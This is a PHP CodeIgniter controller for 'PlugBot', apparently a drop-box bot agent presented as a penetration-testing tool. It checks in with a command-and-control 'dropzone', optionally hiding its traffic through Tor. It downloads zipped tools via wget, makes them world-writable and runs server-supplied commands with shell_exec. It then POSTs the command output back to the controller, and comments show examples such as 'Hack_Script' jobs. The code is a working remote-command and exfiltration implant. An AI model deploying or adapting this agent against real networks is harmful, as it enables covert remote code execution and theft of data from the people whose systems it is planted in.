<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

/*
 * Log codes
 *
 * Bot
 * ============================================
 * 100 = Successful checkin
 * 150 = Error: error during checkin
 * 151 = Error: mising botkey
 *
 *
 * Scheduler
 * ============================================
 * 200 = Downloaded scheduler change
 * 210 = Updated scheduler record as retrieved
 * 250 = Error: scheduler record could not be updated as retrieved
 * 299 = Stopped the scheduler by user request! (remote killswitch)
 * 
 *
 * Applications
 * ============================================
 * 300 = Downloaded app(s)
 * 301 = Installed application
 * 302 = No new apps to download
 * 303 = Updated downloaded app as retrieved
 * 350 = Error: unable to unzip the app file
 * 351 = Error: could not update downloaded app record as retrieved
 *
 * Jobs
 * ============================================
 * 400 = Downloaded job(s)
 * 401 = Marked downloaded job as retrieved
 * 402 = No jobs to download
 * 403 = Job was executed
 * 404 = Job data was saved locally (job output not intended to be uploaded to dropzone)
 * 405 = Job was marked as executed (job_status changed to 2)
 * 450 = Error: job could not be marked as retrieved
 * 460 = Error: could not write output file
 * 470 = Error: missing botkey or dropzone url when trying to run job
 *
 */

class Process_control extends CI_Controller {
	
    function index()
    {
        /* 
         * Load blank page
         */
        
        echo '';
    }

    function check_in()
    {
        /*
         * Performs the bot check-in process to Command & Control to
         * signify connectivity. Downloads any available jobs as well
         * as any changes in scheduling
         */

        // Get botkey
         $botkey = $this->bot_model->getBotKey();

         // Get URL
         $dzone_url = $this->dropzone_model->getDropURL();

        // Get Bot IP
        // Relies on eth0 being the interface name...
        $ip_cmd = "/sbin/ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'";
        $bot_ip = trim(shell_exec($ip_cmd));        

        if (!$this->input->valid_ip($bot_ip))
        {
            $ip_cmd = "/sbin/ifconfig mlan0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'";
            $bot_ip = trim(shell_exec($ip_cmd));

            if(!$this->input->valid_ip($bot_ip))
            {
                $bot_ip = '0.0.0.0'; // Couldn't get the IP address                    
            }
        }

        if ($botkey AND $dzone_url AND $bot_ip) 
        {

            // Perform check-in
            $url = $dzone_url.'/check_in/checkin/'.$botkey.'/'.$bot_ip;
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            if ($this->dropzone_model->getTor() == '2')
            {
                /*
                 * Anonymize through Tor, if previously selected
                 */

                curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:9050");
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);                     
            } 
            $curl_out = curl_exec($ch);
            curl_close($ch);                

            $xml = simplexml_load_string($curl_out);

            /*
             *
             * 
             *   THIS IS TEST CODE FOR ANTI API RELAY
             * 
             * 
             *  
             */

            //$privatekey = $this->bot_model->getBotPrivateKey(); // similar to salt             
            //$privatekey = '0865045097';
            //$qrystring = '/check_in/checkin_test/'.$botkey.'/'. base64_encode($bot_ip2).'/'.$privatekey;

            //$checksum = do_hash($qrystring); // SHA1               
            //$nonce = random_string('unique'); // MD5 string                
            //$prepared_qry = '/check_in/checkin_test/'.$botkey.'/'.base64_encode($bot_ip2).'/'.$checksum.'/'.$nonce;                
            //$xml = simplexml_load_file($dzone_url.'/'.$prepared_qry);

            //$ciphertxt = 'test';

            //$crap = $this->encrypt->encode($ciphertxt);
            //$crap = $this->encrypt->decode($crap);
            //$this->log_model->log_action($botkey,'160','Encrypt:  '.$crap);


            /*
             * 
             * 
             * 
             * 
             *  END
             * 
             * 
             * 
             * 
             */

            // Get status
            $data = $xml->job[0]->status;

            // Check for scheduler change requests
            $scheduler_change = $xml->meta[0]->scheduler;

            // Check for Apps to be installed
            $app_change = $xml->meta[0]->appnum;

            // Check for jobs to be picked up
            $job_change = $xml->meta[0]->jobnum;

            // Log check-in; status of '200' means a successful check-in
            if ($data == '200') 
            {

                /*
                 * Perform check-in functions
                 *
                 * Scheduler changes
                 * App downloads
                 * Job downloads
                 */

                // Log action
                $this->log_model->log_action($botkey,'100','Successful Bot check in.');

                /*
                 * Download any new schedule changes
                 */
                if ($scheduler_change > 0)
                {
                    $this->_downloadScheduler($dzone_url, $botkey);
                }

                /*
                 * Download app(s)
                 */
                if ($app_change > 0)
                {
                    $this->_downloadApp($dzone_url, $botkey);
                }

                /*
                 * Download Job(s)
                 */
                if ($job_change > 0)
                {
                    $this->_downloadJob($dzone_url, $botkey);
                }

            } else {
                // Log action
                $this->log_model->log_action($botkey,'150','Error: Bot check in FAILED!');
            }

        } else {
            // Log action
            $this->log_model->log_action($botkey,'160','Error: Missing botkey or dropzone!');
        }
    }

    function _downloadScheduler($url, $botkey)
    {
        /*
         * This will download all pending requests
         * for change in Scheduling.
         *
         * This is called from the checkin function
         * and should only be called when there are
         * changes pending
         */

        // Read in XML from C&C
        $curl = $url.'/scheduler/get/'.$botkey;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $curl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        if ($this->dropzone_model->getTor() == '2')
        {
            /*
             * Anonymize through Tor, if previously selected
             */

            curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:9050");
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);                     
        } 
        $curl_out = curl_exec($ch);
        curl_close($ch);                

        $xml_sched = simplexml_load_string($curl_out);   


/*
*
* SAVING THIS FOR FUTURE USE WHEN SCHEDULING JOBS
* IS AN OPTION. BUT FOR NOW, THIS WILL BE
* COMMENTED OUT
*
*/
//            // Open the cron file
//            $cronfile = '/var/www/cron/cron.txt';
//            $fh = fopen($cronfile,'w');
//
//            foreach($xml_sched->schedule as $sched)
//            {
//                // Loop through the XML
//                $s_id = trim($sched->id); // Used to update C&C's table
//                $s_type = trim($sched->type);
//                $s_min = trim($sched->min);
//                $s_hour = trim($sched->hour);
//                $s_dom = trim($sched->dom);
//                $s_month = trim($sched->month);
//                $s_dow = trim($sched->dow);
//                $s_cmd = trim($sched->cmd);
//
//                // Process the request as a nomral scheduler request
//                if ($s_type == '1')
//                {
//                    // Process the schedule change
//
//                    // Organize into a crontab format
//                    $contents = $s_min.' '.$s_hour.' '.$s_dom.' '.$s_month.' '.$s_dow.' '.$s_cmd." \r\n";
//                    fwrite($fh, $contents);
//
//                    // Update the downloaded job as 'retrieved'
//                   $this->_updateDownloadedScheduler($url, $s_id, $botkey, $s_type);
//
//                    // Re-start scheduler
//                    $this->_startScheduler();
//
//                   // Log the action
//                   $this->log_model->log_action($botkey,'200','Downloaded schedule change.');
//                }
//
//
//                // Scheduler Type is '99'; which is a request to STOP the scheduler
//                if ($s_type == '99')
//                {
//                    /*
//                     * The scheduler has already been stopped earlier in
//                     * this function, so we will not restart it.
//                     */
//
//                    // Update the downloaded job as 'retrieved'
//                   $this->_updateDownloadedScheduler($url, $s_id, $botkey, $s_type);
//
//                   // Log the action
//                   $this->log_model->log_action($botkey,'200','Downloaded schedule change.');
//                   $this->log_model->log_action($botkey,'299','Stopped the Scheduler by user request!');
//
//                }
//
//            }
//

        foreach($xml_sched->schedule as $sched)
        {

            // Loop through the XML
            $s_id = trim($sched->id); // Used to update C&C's table
            $s_type = trim($sched->type);
            $s_min = trim($sched->min);
            $s_hour = trim($sched->hour);
            $s_dom = trim($sched->dom);
            $s_month = trim($sched->month);
            $s_dow = trim($sched->dow);
            $s_cmd = trim($sched->cmd);


            /*
             *  Scheduler Type is '99'; which is a request to STOP the scheduler
             */
            if ($s_type == '99')
            {
                /*
                 * The scheduler has already been stopped earlier in
                 * this function, so we will not restart it.
                 *
                 */

                // Stop the Scheduler, aka REMOTE KILLSWITCH
                $this->_stopScheduler();

                // Update the downloaded job as 'retrieved'
               $this->_updateDownloadedScheduler($url, $s_id, $botkey, $s_type);

               // Log the action
               $this->log_model->log_action($botkey,'200','Downloaded schedule change.');
               $this->log_model->log_action($botkey,'299','Stopped the Scheduler by user request!');

            }
        }

        /*
         *
         * Uncomment when Scheduling Jobs is implemented
         *
         */
        // Close cron file
        //fclose($fh);

    }

    function _updateDownloadedScheduler($url, $id, $botkey, $s_type)
    {
        /*
         * This will update the cron table according
         * to a job issued by Command & Control
         */

        // Update Scheduler record at C&C
        $curl = $url.'/scheduler/upd/'.$id.'/'.$botkey.'/'.$s_type;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $curl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        if ($this->dropzone_model->getTor() == '2')
        {
            /*
             * Anonymize through Tor, if previously selected
             */

            curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:9050");
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);                     
        } 
        $curl_out = curl_exec($ch);
        curl_close($ch);               
        $xml = simplexml_load_string($curl_out);

        // Get status; expect '2'
        $status = $xml->scheduler[0]->status;
        $status = trim($status);

        // If record has been successfully updated
        if ($status == 2) {
            // Log action
            $this->log_model->log_action($botkey,'210','Updated downloaded scheduler_id: '.$id.' as retrieved.');
        } else {
            // Log action
            $this->log_model->log_action($botkey,'250','Error: Scheduler could not be updated!');
        }
    }

    function _downloadApp($url, $botkey)
    {
        /*
         * This will download any pending
         * applications
         *
         * The pending app should be zipped with Winzip and
         * have a *.zip extension. The app should be
         * downloadable via HTTP
         *
         * For example: http://www.somedomain.com/plugbot/apps/Hack_Me_App.zip
         */

        // Download app details
        $curl = $url.'/app/get/'.$botkey;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $curl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        if ($this->dropzone_model->getTor() == '2')
        {
            /*
             * Anonymize through Tor, if previously selected
             */

            curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:9050");
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);                     
        } 
        $curl_out = curl_exec($ch);
        curl_close($ch);                

        $xml_app = simplexml_load_string($curl_out);


        //$xml_app = simplexml_load_file($url.'/app/get/'.$botkey);

        // Count pending apps, if any
        $num = $xml_app->detail[0]->num;
        $num = trim($num);

        // If pending app(s), then proceed to download
        if ($num > 0)
        {
            foreach($xml_app->app as $app)
            {
                // Parse the app data
                $app_id = trim($app->id);
                $app_name = trim($app->name);
                $app_random = trim($app->random);
                $app_url = trim($app->url);
                $app_exec = trim($app->exec);
                $app_file = trim($app->file);

                // Path
                $full_app_path = '/var/www/apps/'.url_title($app_name).'.'.$app_random;

                // Create app folders, if they don't exist already
                if (!is_dir($full_app_path))
                {
                    // Create app folder
                    mkdir($full_app_path, 0777);

                    // Create data folder if it doesn't exist
                    if (!is_dir($full_app_path.'/data'))
                    {
                        // Create data folder to hold reports
                        mkdir($full_app_path.'/data', 0777);
                    }
                }

                // Download zip into new app directory
                exec('cd '.$full_app_path.'; wget '.$app_url.'/'.$app_file, $crap);

                // Full path and Filename
                $app_zip = $full_app_path.'/'.$app_file;

                // Check for existence of downloaded app zip and new folder
                if (file_exists($app_zip))
                {
                    // Unzip
                    $zip = new ZipArchive;
                    if ($zip->open($app_zip) === TRUE) {
                        $zip->extractTo($full_app_path);
                        $zip->close();
                        echo 'ok ';

                        /*
                         * -------------------------------------
                         * Proceed to process the downloaded app
                         * -------------------------------------
                         */

                         /*
                         * Change permissions on newly downloaded app
                         *
                         * THIS SHOULD BE RE-EVALUATED IN THE FUTURE
                         * TO INCLUDE PERMISSIONS THAT ARE APPROPRIATE
                         * TO THE NEEDS OF THE APP
                         */
                        system('chmod -R 777 '.$full_app_path);
                        /*
                         *
                         */

                        // Convert files to *nix using Flip
                        system('cd '.$full_app_path.'; toix *');

                        // Delete zipped app file; no longer needed
                        unlink($app_zip);

                        /*
                         * Import into tblApp
                         */
                         $this->app_model->insertApp($botkey, $app_random, $full_app_path, $app_exec, $app_name );

                        // Log action
                        $this->log_model->log_action($botkey,'301','Installed application: '.strtoupper($app_name).'.');

                        // Update the downloaded app as 'retrieved'
                        $this->_updateDownloadedApp($url, $app_id, $botkey);

                    } else {

                        echo 'failed ';
                        // Log the action
                        $this->log_model->log_action($botkey,'350','Error: unable to unzip the app!');
                    }

                }

            }

            // Log the action
            $this->log_model->log_action($botkey,'300','Downloaded '.$num.' app(s).');

        } else {
            // Log the action
            $this->log_model->log_action($botkey,'302','No new apps to download.');
        }
    }

    function _updateDownloadedApp($url, $id, $botkey)
    {
        /*
         * After the app has been retrieved from Command & Control, the
         * app record at Command & Control should be updated by
         * PlugBot as 'retrieved' by updating the record with a status
         * of '2'
         */

        // Update app record at C&C
        $curl = $url.'/app/upd/'.$id.'/'.$botkey;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $curl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        if ($this->dropzone_model->getTor() == '2')
        {
            /*
             * Anonymize through Tor, if previously selected
             */

            curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:9050");
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);                     
        } 
        $curl_out = curl_exec($ch);
        curl_close($ch);                

        $xml = simplexml_load_string($curl_out);  

        //$xml = simplexml_load_file($url.'/app/upd/'.$id.'/'.$botkey);

        // Get status; expect '2'
        $status = $xml->app[0]->status;

        // If record has been successfully updated
        if ($status == 2) {
            // Log action
            $this->log_model->log_action($botkey,'303','Updated downloaded app_id: '.$id.' as retrieved.');
        } else {
            // Log action
            $this->log_model->log_action($botkey,'351','Error: could not mark downloaded app as retrieved!');
        }
    }


    function _downloadJob($url, $bot_key)
    {
        /*
         * While checkDownloads job(s) information, imports data
         * from XML
         *
         */

        // Download job
        $curl = $url.'/job/get/'.$bot_key;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $curl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        if ($this->dropzone_model->getTor() == '2')
        {
            /*
             * Anonymize through Tor, if previously selected
             */

            curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:9050");
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);                     
        } 
        $curl_out = curl_exec($ch);
        curl_close($ch);                

        $xml_job = simplexml_load_string($curl_out);            

        //$xml_job = simplexml_load_file($url.'/job/get/'.$bot_key);

        // Count jobs, if any
        $num = $xml_job->detail[0]->num;
        $num = xss_clean(trim($num));

        if ($num > 0)
        {
            foreach($xml_job->job as $job)
            {
                // Parse the job data
                $job_id = trim($job->id);
                $job_name = trim($job->name);
                $job_random = trim($job->random);
                $job_app_random = trim($job->apprandom);
                $job_cmd = trim($job->command);
                $job_output = trim($job->output);


                /*
                 * Insert the new job into tblJob
                 */
                 $this->job_model->insertJob($bot_key, $job_name, $job_app_random, $job_random, $job_cmd, $job_output, $job_id);

                // Update the downloaded job as 'retrieved'
                $this->_updateDownloadedJob($url, $job_id, $bot_key, $job_output);

            }

            // Log the action
            $this->log_model->log_action($bot_key,'400','Downloaded '.$num.' job(s).');

        } else {
            // Log the action
            $this->log_model->log_action($bot_key,'401','No jobs to download.');
        }
    }

    function _updateDownloadedJob($jurl, $id, $botkey, $job_output)
    {
        /*
         * After the job has been retrieved from Command & Control, the
         * job record at Command & Control should be updated by
         * PlugBot as 'retrieved' by updating the record with a status
         * of '2' or '4' or '1'
         */

        // Update job record at C&C
        $curl = $jurl.'/job/upd/'.$id.'/'.$botkey.'/'.$job_output;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $curl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        if ($this->dropzone_model->getTor() == '2')
        {
            /*
             * Anonymize through Tor, if previously selected
             */

            curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:9050");
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);                     
        } 
        $curl_out = curl_exec($ch);
        curl_close($ch);                

        $xml = simplexml_load_string($curl_out);

        //$xml = simplexml_load_file($jurl.'/job/upd/'.$id.'/'.$botkey.'/'.$job_output);


        // Get status;
        // expect '2' = non-interactive job received
        //or '9' = interactice job
        // or '1' = save to plugbot
        $status = $xml->job[0]->status;

        // If record has been successfully updated
        if ($status == 2 OR $status == 9 OR $status == 1) { 
            // Log action
            $this->log_model->log_action($botkey,'401','Updated downloaded job_id: '.$id.' as retrieved.');
        } else {
            // Log action
            $this->log_model->log_action($botkey,'450','Job could not be updated!');
        }
    }

    function runJob()
    {
        /*
         * Function that is run independently of the
         * major check_in() function schedule.
         *
         * This will query tblJob for all pending
         * jobs (status=1) and run those jobs
         */

         // Get botkey
         $botkey = $this->bot_model->getBotKey();

         // Get URL
         $dzone_url = $this->dropzone_model->getDropURL();

        // Run job if botkey and dzone are present
        if ($botkey AND $dzone_url)
        {
             // Count number of new jobs pending (job_status = 1)
            $query = $this->job_model->getAllNewJobs($botkey);

            if ($query->num_rows() > 0)
            {
                // Run job(s)
                foreach ($query->result() as $job)
                {
                    /*
                     * Pending jobs are present, now run them
                     */

                    // Read data from job query
                    $job_id = trim($job->job_id);
                    $job_name = trim($job->job_name);
                    $job_output = trim($job->job_output);
                    $job_botkey = trim($job->job_botkey);
                    $job_random = trim($job->job_random);
                    $job_command = trim($job->job_command);
                    $job_app_random = trim($job->job_app_random);
                    $job_updateid = trim($job->job_updateid); // Job recordID in the C&C database

                    // Query tblApp for the app_random to get the app's details
                    $qry = $this->app_model->getApp($botkey, $job_app_random);

                    // Populate vars from app query
                    if ($qry->num_rows() > 0)
                    {
                       $appz = $qry->row();
                       $app_dir = trim($appz->app_dir);
                       $app_exec = trim($appz->app_exec);
                       $app_name = trim($appz->app_name);
                       $app_random = trim($appz->app_random);

                    /*
                     * Execute the job
                     */
                    $this->_exec_job($dzone_url, $app_dir, $app_exec, $app_name, $app_random, $job_command, $job_random, $job_name, $job_id, $botkey, $job_output, $job_updateid);

                    // Logging will take place in the previous private method                           
                    } else {
                        echo "crap";
                    }

                }

            }                

        } else {
            // Log action
            $this->log_model->log_action($botkey,'470','Missing botkey or dropzone URL when trying to run job');
        }
    }

    private function _exec_job($dzone_url, $app_dir, $app_exec, $app_name, $app_random, $job_command, $job_random, $job_name, $job_id, $botkey, $job_output, $job_updateid)
    {
        /*
         * This method is called from runJob() and will
         * execute jobs
         *
         */

        $exec_dir = '/var/www/apps/'.url_title($app_name).'.'.$app_random.'/'; // Example: /var/www/apps/Hack_Script.34435/
        $full_cmd = $exec_dir.$job_command; // Example: /var/www/apps/Hack_Script.34435/script.py 192.168.31.1

        /*
         * See if the upload should be FTP or upload to the C&C database
         *
         * 2 = Upload to the C&C database
         * 3 = Upload to the Dropzone via FTP
         * 4 = No output; Interactive job
         */

        // Upload data to C&C
        if ($job_output == 2)
        {
            /*
            * Execute the job
            */
            $output = shell_exec($full_cmd);

            // File output stuff
            $myFile = $exec_dir.'data/'.url_title($job_name).'.'.$job_random.'.txt'; // Example: /var/www/apps/Hack_Script.34435/data/Script_testing_job.98754.txt
            $fh = fopen($myFile, 'w');
            if (!$fh)
            {
                // If unable to write file, log it
                $this->log_model->log_action($botkey, '460', 'could not write output file for '.$job_name);                    
            }
            $stringData = $output;
            fwrite($fh, $stringData);
            fclose($fh);

            // Setup the data to be uploaded to C&C
            $data = array(
                'output'    =>  $output,
                'botkey'    =>  $botkey,
                'job_id'    =>  $job_updateid
            );

            // Format the cURL request               
            $url = $dzone_url.'/job/receiveOutput';
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            if ($this->dropzone_model->getTor() == '2')
            {
                /*
                 * Anonymize through Tor, if previously selected
                 */

                curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:9050");
                curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);                     
            } 
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            $curl_out = curl_exec($ch);
            curl_close($ch);


            // Delete file
            unlink($myFile);

            // Mark this job as completed
            $this->_updateRunJob($job_id, $botkey);

            // Log action
            $this->log_model->log_action($botkey, '403', $job_name.' was executed.');

        }

        // Save to Bot
        if ($job_output == 1)
        {
            /*
            * If the job is NOT to be uploaded to the DropZone the
            * job output file will be saved to the application's
            * data folder.
            */

            /*
            * Execute the job
            */
            $output = shell_exec($full_cmd);

            // File output stuff
            $myFile = $exec_dir.'data/'.url_title($job_name).'.'.$job_random.'.txt'; // Example: /var/www/apps/Hack_Script.34435/data/Script_testing_job.98754.txt
            $fh = fopen($myFile, 'w');
            if (!$fh)
            {
                // If unable to write file, log it
                $this->log_model->log_action($botkey, '460', 'could not write output file for '.$job_name);                    
            }              
            $stringData = $output;
            fwrite($fh, $stringData);
            fclose($fh);

            // Mark this job as completed
            $this->_updateRunJob($job_id, $botkey);

            // Log action
            $this->log_model->log_action($botkey,'404', 'Job data for '.$job_name.' was saved locally');
        }

        // Interactive job; no output
        if ($job_output == 4)
        {
            /*
            * Execute the job
            */
            $output = shell_exec($full_cmd);


            // Mark this job as completed
            $this->_updateRunJob($job_id, $botkey);

            // Log action
            $this->log_model->log_action($botkey,'404', 'Interactive job titled "'.$job_name.'" was executed.');
        }

    }

    function _updateRunJob($job_id, $botkey)
    {
        /*
         * Mark the job as completed by the bot
         */
        
        // Mark the job as completed
        $this->job_model->updateJobComplete($job_id);

        // Log action
        $this->log_model->log_action($botkey,'405','Job id: '.$job_id.' has been updated as complete');
    }

    function _stopScheduler()
    {
        /*
         * This will de-initialize cron if the
         * user so chooses to do so.
         *
         * Reason could be that the pen test
         * engagement has ended
         */

        // Stop cron
        system('crontab -u www-data -r');
        
    }

    function _startScheduler()
    {
        /*
         * This will re-initialize cron if it
         * has been stopped
         */

        // Start cron
        system('crontab -u www-data /var/www/cron/cron.txt');

    }

}

/* End of file process_control.php */
/* Location: ./system/application/controllers/process_control.php */
